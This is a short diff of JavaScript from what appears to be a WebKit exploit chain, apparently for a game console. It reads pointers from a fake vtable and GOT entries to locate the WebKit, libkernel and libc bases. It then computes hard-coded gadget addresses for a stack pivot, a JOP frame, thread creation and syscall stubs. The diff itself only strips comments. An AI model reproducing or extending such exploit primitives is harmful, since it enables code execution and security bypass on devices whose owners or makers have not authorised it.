@@ -126,22 +126,16 @@ function get_got_addr(idx) {
   offset += p + 6;
   return read_ptr_at(offset);
 }
-
-// These are not real bases but rather some low addresses
 var webkit_base = read_ptr_at(fake_vtable) - 0x900000;
 var libkernel_base = get_got_addr(789);
 var libc_base = get_got_addr(573);
 var saveall_addr = libc_base + 0x22a94;
 var loadall_addr = libc_base + 0x26ee8;
-//var setjmp_addr = libc_base+0x21663a;
-//var longjmp_addr = libc_base+0x21668a;
 var pivot_addr = libc_base + 0x26f5e;
 var infloop_addr = libc_base + 0x393f0;
 var jop_frame_addr = libc_base + 0x669b0;
 var get_errno_addr_addr = libkernel_base + 0x11810;
 var pthread_create_addr = libkernel_base + 0x17190;
-
-// Syscalls
 var sigtimedwait_addr = libkernel_base + 0x26720;
 var sigwaitinfo_addr = libkernel_base + 0x26740;
 var evf_set_addr = libkernel_base + 0x26760;
